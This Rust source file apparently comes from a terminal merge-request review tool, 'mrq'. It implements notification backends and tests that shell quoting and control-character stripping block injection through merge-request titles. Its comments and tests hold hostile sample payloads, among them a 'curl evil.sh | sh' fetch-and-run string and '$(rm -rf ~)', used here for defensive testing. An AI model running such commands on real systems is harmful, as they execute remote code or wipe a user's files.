//! Notification delivery: the four backends and the bell.
//!
//! There is no portable way to raise a desktop notification from a terminal program, so
//! there are four mechanisms and an order to try them in. The OSC forms are the important
//! ones: the escape travels back through the tty, so it reaches the *local* terminal even
//! when `mrq` is running on the other end of an SSH connection — which is where a review
//! queue is often watched from.
//!
//! # Untrusted text in a command line and in an escape sequence
//!
//! `{title}` and `{body}` carry a merge-request title, which comes from the instance and
//! can be set by anyone able to open an MR on a watched project. Both delivery paths treat
//! it as hostile:
//!
//! - the command backend runs through a shell, so substituted values are shell-quoted;
//!   without that, a merge request titled `$(...)` would be arbitrary code execution on
//!   the reviewer's machine every time it appeared in a filter.
//! - the OSC backends strip control characters, because an `ESC` or `BEL` inside a field
//!   would terminate the sequence early and leave the rest to be read as terminal
//!   commands. OSC 777 additionally loses `;` from its title field, which is a field
//!   separator there.
//!
//! # Delivery is described, not performed
//!
//! [`Backend::deliver`] returns a [`Delivery`] rather than writing anything. Escapes have
//! to reach stdout in one write so a ratatui frame cannot interleave with them, and the
//! caller is the only thing that knows when it is between frames. It also keeps every
//! backend testable without a terminal or a subprocess.

use crate::config::schema::{Notifications, NotifyBackend};
use crate::term::caps::{Capabilities, NotifyEscape};

/// `BEL`. Written alongside any backend when `bell = true`, and what drives the tmux and
/// screen window-activity markers.
const BEL: &str = "\x07";

/// The resolved mechanism for this session.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Backend {
    /// `ESC ] 9 ; {body} BEL`
    Osc9,
    /// `ESC ] 777 ; notify ; {title} ; {body} BEL`
    Osc777,
    /// A shell command with `{title}` and `{body}` substituted.
    Command(String),
    /// Status-bar flash only.
    None,
}

/// What the caller must do to deliver one notification.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Delivery {
    /// Bytes for stdout, to be written in a single call. Empty when there are none.
    ///
    /// Carries the bell too, so it accompanies a command backend as well as an OSC one.
    pub escape: String,
    /// A shell command to spawn and not wait for.
    pub spawn: Option<String>,
}

impl Delivery {
    #[cfg(test)]
    const fn is_empty(&self) -> bool {
        self.escape.is_empty() && self.spawn.is_none()
    }
}

/// Which command-backend helpers exist on this machine.
///
/// Injected rather than probed inside [`resolve`] so the choice is a pure function of its
/// inputs, and so tests do not depend on what happens to be installed on the machine
/// running them.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Helpers {
    pub terminal_notifier: bool,
    pub notify_send: bool,
}

impl Helpers {
    pub fn detect() -> Self {
        Self {
            terminal_notifier: on_path("terminal-notifier"),
            notify_send: on_path("notify-send"),
        }
    }

    /// The auto-probe's command backend for this platform.
    fn default_command(self) -> Option<String> {
        if cfg!(target_os = "macos") && self.terminal_notifier {
            return Some("terminal-notifier -title {title} -message {body}".to_owned());
        }
        if cfg!(target_os = "linux") && self.notify_send {
            // The flag is static text, so unlike `{title}`/`{body}` it needs no quoting.
            return Some("notify-send -a MRQ {title} {body}".to_owned());
        }
        None
    }
}

/// Whether an executable of this name is on `$PATH`.
fn on_path(name: &str) -> bool {
    let Some(path) = std::env::var_os("PATH") else {
        return false;
    };
    std::env::split_paths(&path).any(|dir| {
        let candidate = dir.join(name);
        // Existence is not enough: a non-executable file of the same name in a PATH
        // directory would make us pick a backend that cannot run.
        std::fs::metadata(&candidate).is_ok_and(|m| {
            use std::os::unix::fs::PermissionsExt;
            m.is_file() && m.permissions().mode() & 0o111 != 0
        })
    })
}

/// Choose the backend for this session.
///
/// An explicit `backend` in the config wins over detection outright, including over SSH:
/// the auto probe avoids a command backend there because `notify-send` would raise a
/// notification on the wrong machine, but a user who named a command chose it knowing
/// their own setup.
pub fn resolve(config: &Notifications, caps: &Capabilities, helpers: Helpers) -> Backend {
    if !config.enabled {
        return Backend::None;
    }

    match config.backend {
        NotifyBackend::None => Backend::None,
        NotifyBackend::Osc9 => Backend::Osc9,
        NotifyBackend::Osc777 => Backend::Osc777,
        // `validate` guarantees a non-empty command for this backend.
        NotifyBackend::Command => Backend::Command(config.command.clone()),

        NotifyBackend::Auto => match caps.notify {
            NotifyEscape::Osc9 => Backend::Osc9,
            NotifyEscape::Osc777 => Backend::Osc777,
            NotifyEscape::None if caps.over_ssh => Backend::None,
            NotifyEscape::None => match helpers.default_command() {
                Some(command) => Backend::Command(command),
                None => Backend::None,
            },
        },
    }
}

impl Backend {
    /// A one-line description for the single startup log line.
    pub fn describe(&self) -> String {
        match self {
            Self::Osc9 => "OSC 9".to_owned(),
            Self::Osc777 => "OSC 777".to_owned(),
            Self::Command(command) => format!("command `{command}`"),
            Self::None => "none (status bar only)".to_owned(),
        }
    }

    /// What delivering this notification requires.
    ///
    /// `bell` comes from `notifications.bell` and applies to every backend, including
    /// `none`: a bell with no notification still marks the tmux window.
    pub fn deliver(&self, title: &str, body: &str, bell: bool) -> Delivery {
        let mut delivery = Delivery::default();

        match self {
            // OSC 9 has one field, so the title is folded into the body — there is
            // nowhere else to put it, and dropping it would lose which filter fired.
            Self::Osc9 => {
                let text = join(title, body);
                delivery.escape = format!("\x1b]9;{}{BEL}", escape_field(&text));
            }
            Self::Osc777 => {
                delivery.escape = format!(
                    "\x1b]777;notify;{};{}{BEL}",
                    osc777_title(title),
                    escape_field(body)
                );
            }
            Self::Command(command) => {
                delivery.spawn = Some(substitute(command, title, body));
            }
            Self::None => {}
        }

        // Appended rather than inserted: an OSC 9 or 777 sequence already ends in BEL, so
        // a second one is a separate, deliberate bell rather than part of the escape.
        if bell {
            delivery.escape.push_str(BEL);
        }
        delivery
    }
}

fn join(title: &str, body: &str) -> String {
    match (title.is_empty(), body.is_empty()) {
        (_, true) => title.to_owned(),
        (true, _) => body.to_owned(),
        _ => format!("{title}: {body}"),
    }
}

/// Strip what could end an OSC sequence early or start another one.
///
/// Control characters only: everything else is safe inside an OSC payload, and removing
/// more would mangle merge-request titles for no gain.
fn escape_field(text: &str) -> String {
    text.chars().filter(|c| !c.is_control()).collect()
}

/// The OSC 777 title field, which is delimited by `;`.
///
/// A `;` in a merge-request title would shift the body into the title's place, so it
/// becomes a comma. The body needs no such treatment: it is the last field, so an extra
/// separator there is read as part of it.
fn osc777_title(title: &str) -> String {
    escape_field(title).replace(';', ",")
}

/// Substitute `{title}` and `{body}` into a user command, shell-quoted.
///
/// The quoting is the whole point. A merge request titled
/// `"; curl evil.sh | sh; echo "` would otherwise run on the reviewer's machine the
/// moment it entered a filter, and merge-request titles are writable by anyone who can
/// open one on a watched project.
fn substitute(command: &str, title: &str, body: &str) -> String {
    command
        .replace("{title}", &shell_quote(title))
        .replace("{body}", &shell_quote(body))
}

/// Wrap a value so a POSIX shell reads it as one literal argument.
///
/// Single quotes suspend every form of expansion, so the only character needing care is
/// the single quote itself: the string is closed, an escaped quote is emitted, and the
/// string is reopened.
fn shell_quote(value: &str) -> String {
    // Control characters are dropped rather than quoted. A newline inside a quoted
    // argument is legal but turns one log line into several, and a merge-request title
    // has no business containing one.
    let cleaned: String = value.chars().filter(|c| !c.is_control()).collect();
    format!("'{}'", cleaned.replace('\'', r"'\''"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::schema::NotifyBackend;
    use crate::term::caps::{ColorDepth, NotifyEscape};

    fn caps(notify: NotifyEscape, over_ssh: bool) -> Capabilities {
        Capabilities {
            color: ColorDepth::TrueColor,
            hyperlinks: true,
            notify,
            focus_events: true,
            multiplexed: false,
            over_ssh,
        }
    }

    fn config(backend: NotifyBackend) -> Notifications {
        Notifications {
            backend,
            ..Notifications::default()
        }
    }

    fn both_helpers() -> Helpers {
        Helpers {
            terminal_notifier: true,
            notify_send: true,
        }
    }

    // ------------------------------------------------------------------ backend choice

    /// The auto probe takes whichever escape the terminal was detected to
    /// understand.
    #[test]
    fn auto_follows_the_detected_escape() {
        let auto = config(NotifyBackend::Auto);

        assert_eq!(
            resolve(&auto, &caps(NotifyEscape::Osc9, false), Helpers::default()),
            Backend::Osc9
        );
        assert_eq!(
            resolve(
                &auto,
                &caps(NotifyEscape::Osc777, false),
                Helpers::default()
            ),
            Backend::Osc777
        );
    }

    /// Step 3: a terminal with no escape support falls through to a helper binary.
    #[test]
    fn auto_falls_through_to_a_command_helper() {
        let auto = config(NotifyBackend::Auto);
        let resolved = resolve(&auto, &caps(NotifyEscape::None, false), both_helpers());

        match resolved {
            Backend::Command(command) => {
                assert!(command.contains("{title}"), "{command}");
                assert!(command.contains("{body}"), "{command}");
                let expected = if cfg!(target_os = "macos") {
                    "terminal-notifier"
                } else {
                    "notify-send"
                };
                assert!(command.starts_with(expected), "{command}");
                if cfg!(target_os = "linux") {
                    assert!(command.contains("-a MRQ"), "{command}");
                }
            }
            other => panic!("expected a command backend, got {other:?}"),
        }
    }

    /// Step 4: nothing detected and no helper installed is not an error — the status bar
    /// still says what happened.
    #[test]
    fn auto_ends_at_none_when_there_is_nothing_to_use() {
        let auto = config(NotifyBackend::Auto);
        assert_eq!(
            resolve(&auto, &caps(NotifyEscape::None, false), Helpers::default()),
            Backend::None
        );
    }

    /// Over SSH the escape reaches the local terminal, so the OSC backends
    /// are exactly the ones that still work.
    #[test]
    fn ssh_keeps_the_osc_backends_and_drops_the_auto_command_one() {
        let auto = config(NotifyBackend::Auto);

        assert_eq!(
            resolve(&auto, &caps(NotifyEscape::Osc9, true), both_helpers()),
            Backend::Osc9,
            "the escape travels back down the tty"
        );
        assert_eq!(
            resolve(&auto, &caps(NotifyEscape::None, true), both_helpers()),
            Backend::None,
            "notify-send on the remote host notifies nobody"
        );
    }

    /// An explicit choice is the user's, including over SSH: they configured that command
    /// knowing their own setup, and second-guessing it would make the setting a lie.
    #[test]
    fn an_explicit_backend_overrides_detection() {
        let mut command = config(NotifyBackend::Command);
        command.command = "my-notifier {title}".into();

        assert_eq!(
            resolve(
                &command,
                &caps(NotifyEscape::Osc9, true),
                Helpers::default()
            ),
            Backend::Command("my-notifier {title}".into()),
            "explicit command wins over a detected escape and over SSH"
        );
        assert_eq!(
            resolve(
                &config(NotifyBackend::Osc777),
                &caps(NotifyEscape::Osc9, false),
                Helpers::default()
            ),
            Backend::Osc777,
            "and an explicit escape wins over the detected one"
        );
        assert_eq!(
            resolve(
                &config(NotifyBackend::Osc9),
                &caps(NotifyEscape::None, false),
                Helpers::default()
            ),
            Backend::Osc9,
            "even when nothing was detected"
        );
    }

    #[test]
    fn disabling_notifications_wins_over_every_backend() {
        for backend in [
            NotifyBackend::Auto,
            NotifyBackend::Osc9,
            NotifyBackend::Osc777,
            NotifyBackend::Command,
            NotifyBackend::None,
        ] {
            let disabled = Notifications {
                backend,
                enabled: false,
                command: "notify-send {title}".into(),
                ..Notifications::default()
            };
            assert_eq!(
                resolve(&disabled, &caps(NotifyEscape::Osc9, false), both_helpers()),
                Backend::None,
                "{backend:?}"
            );
        }
    }

    #[test]
    fn every_backend_describes_itself_for_the_startup_log() {
        for backend in [
            Backend::Osc9,
            Backend::Osc777,
            Backend::Command("notify-send {title}".into()),
            Backend::None,
        ] {
            assert!(!backend.describe().is_empty(), "{backend:?}");
        }
        assert!(
            Backend::Command("x".into()).describe().contains('x'),
            "the log has to name the command, or it cannot be debugged"
        );
    }

    // ----------------------------------------------------------------- escape shapes

    /// The documented byte sequences for each backend.
    #[test]
    fn the_osc_forms_match_the_spec() {
        let nine = Backend::Osc9.deliver("Reviewing", "2 new merge requests", false);
        assert_eq!(
            nine.escape, "\x1b]9;Reviewing: 2 new merge requests\x07",
            "OSC 9 has one field, so the title is folded in"
        );
        assert!(nine.spawn.is_none());

        let seven = Backend::Osc777.deliver("Reviewing", "2 new merge requests", false);
        assert_eq!(
            seven.escape,
            "\x1b]777;notify;Reviewing;2 new merge requests\x07"
        );
    }

    #[test]
    fn none_delivers_nothing_without_a_bell() {
        assert!(Backend::None.deliver("t", "b", false).is_empty());
    }

    /// The bell accompanies whichever backend is in use, because it is what
    /// marks the tmux window rather than a notification in its own right.
    #[test]
    fn the_bell_accompanies_every_backend() {
        assert!(Backend::None.deliver("t", "b", true).escape.ends_with(BEL));
        assert_eq!(Backend::None.deliver("t", "b", true).escape, BEL);

        let osc9 = Backend::Osc9.deliver("t", "b", true);
        assert!(osc9.escape.ends_with("\x07\x07"), "{:?}", osc9.escape);

        // A command backend still rings, and the bell is the only thing on stdout.
        let command = Backend::Command("notify-send {title}".into()).deliver("t", "b", true);
        assert_eq!(command.escape, BEL);
        assert!(command.spawn.is_some());
    }

    #[test]
    fn a_command_backend_writes_nothing_to_stdout_without_a_bell() {
        let delivery = Backend::Command("notify-send {title}".into()).deliver("t", "b", false);
        assert!(
            delivery.escape.is_empty(),
            "a stray write would corrupt the frame"
        );
    }

    /// An `ESC` inside a title would close the OSC and leave the remainder of the title
    /// to be interpreted as terminal commands.
    #[test]
    fn control_characters_cannot_escape_an_osc_sequence() {
        let hostile = "boom\x1b]0;pwned\x07 and \x07more";

        for delivery in [
            Backend::Osc9.deliver(hostile, hostile, false),
            Backend::Osc777.deliver(hostile, hostile, false),
        ] {
            let payload = delivery
                .escape
                .trim_end_matches(BEL)
                .trim_start_matches("\x1b]");
            assert!(
                !payload.contains('\x1b'),
                "an ESC survived: {:?}",
                delivery.escape
            );
            assert!(
                !payload.contains('\x07'),
                "a BEL survived: {:?}",
                delivery.escape
            );
        }
    }

    /// `;` delimits the OSC 777 fields, so one in the title would push the body into the
    /// title's place and show the user the wrong thing.
    #[test]
    fn a_semicolon_in_a_title_cannot_shift_the_osc_777_fields() {
        let delivery = Backend::Osc777.deliver("a;b;c", "body", false);

        assert_eq!(delivery.escape, "\x1b]777;notify;a,b,c;body\x07");
        let fields: Vec<&str> = delivery
            .escape
            .trim_start_matches("\x1b]")
            .trim_end_matches(BEL)
            .split(';')
            .collect();
        assert_eq!(fields, ["777", "notify", "a,b,c", "body"]);
    }

    /// Multi-line bodies and newlines in titles must not break the sequence either.
    #[test]
    fn newlines_are_stripped_from_both_fields() {
        let delivery = Backend::Osc777.deliver("one\ntwo", "three\r\nfour", false);
        assert!(!delivery.escape.contains('\n'));
        assert!(!delivery.escape.contains('\r'));
    }

    #[test]
    fn an_empty_title_or_body_still_produces_a_sensible_message() {
        assert_eq!(
            Backend::Osc9.deliver("", "body", false).escape,
            "\x1b]9;body\x07"
        );
        assert_eq!(
            Backend::Osc9.deliver("title", "", false).escape,
            "\x1b]9;title\x07"
        );
    }

    // -------------------------------------------------------------- command injection

    /// The reason substitution is quoted at all. A merge-request title is writable by
    /// anyone who can open an MR on a watched project, and the command runs through a
    /// shell, so an unquoted `{title}` is remote code execution on the reviewer's box.
    ///
    /// Asserted against a real `/bin/sh` rather than by inspecting the quoting: correct
    /// `'\''` escaping looks alarming, and a first version of this test read it as an
    /// injection when the shell was in fact handling it correctly. Only the shell's own
    /// parse settles what the shell does.
    #[test]
    fn a_hostile_title_cannot_escape_the_command() {
        let tmp = tempfile::tempdir().unwrap();
        let marker = tmp.path().join("pwned");

        let payloads = [
            "'; curl evil.sh | sh; echo '".to_owned(),
            "$(rm -rf ~)".to_owned(),
            "`id`".to_owned(),
            "a && b".to_owned(),
            "$HOME".to_owned(),
            "\"; id; \"".to_owned(),
            "it's got a quote".to_owned(),
            // The one with an observable side effect if it ever escapes.
            format!("x; touch {}", marker.display()),
            format!("$(touch {})", marker.display()),
        ];

        for payload in &payloads {
            let command = Backend::Command(r"printf '%s\n' {title} {body}".into())
                .deliver(payload, payload, false)
                .spawn
                .expect("a command backend spawns");

            let out = std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(&command)
                .output()
                .expect("sh is available");
            assert!(out.status.success(), "{command}");

            // Exactly two arguments, each the literal payload: nothing was split on a
            // metacharacter, expanded, or run as a second command.
            let lines: Vec<String> = String::from_utf8_lossy(&out.stdout)
                .lines()
                .map(str::to_owned)
                .collect();
            assert_eq!(
                lines,
                [payload.clone(), payload.clone()],
                "the shell did not see the payload as two literal arguments: {command}"
            );
        }

        assert!(
            !marker.exists(),
            "a payload executed: {} was created",
            marker.display()
        );
    }

    /// The quoting has to be reversible, or a legitimate apostrophe in a title breaks the
    /// command instead of merely being ugly.
    #[test]
    fn quoting_round_trips_through_a_real_shell() {
        for value in [
            "plain",
            "it's got a quote",
            "'; id; '",
            "$(rm -rf ~)",
            "a;b|c&d",
            "spaces   and\ttabs",
        ] {
            let command = substitute("printf %s {title}", value, "");
            let out = std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(&command)
                .output()
                .expect("sh is available");

            assert!(out.status.success(), "{command}");
            let printed = String::from_utf8_lossy(&out.stdout);
            let expected: String = value.chars().filter(|c| !c.is_control()).collect();
            assert_eq!(
                printed, expected,
                "the shell saw something other than the literal value: {command}"
            );
        }
    }

    #[test]
    fn both_placeholders_are_substituted_and_unknown_ones_are_left_alone() {
        let spawn = Backend::Command("notify {title} -- {body} {other}".into())
            .deliver("T", "B", false)
            .spawn
            .unwrap();

        assert_eq!(spawn, "notify 'T' -- 'B' {other}");
    }

    /// A command that mentions neither placeholder is a user's choice, not a bug.
    #[test]
    fn a_command_without_placeholders_is_passed_through() {
        let spawn = Backend::Command("say something".into())
            .deliver("T", "B", false)
            .spawn
            .unwrap();
        assert_eq!(spawn, "say something");
    }

    /// The single-quote escape itself, since everything above depends on it.
    #[test]
    fn shell_quoting_closes_and_reopens_around_a_quote() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
        assert_eq!(shell_quote(""), "''");
        assert_eq!(
            shell_quote("a\nb"),
            "'ab'",
            "control characters are dropped"
        );
    }

    #[test]
    fn path_probing_does_not_pick_a_non_executable() {
        // `sh` exists and is executable everywhere this runs; the other cannot exist.
        assert!(on_path("sh"));
        assert!(!on_path("mrq-definitely-not-a-real-binary"));
    }
}
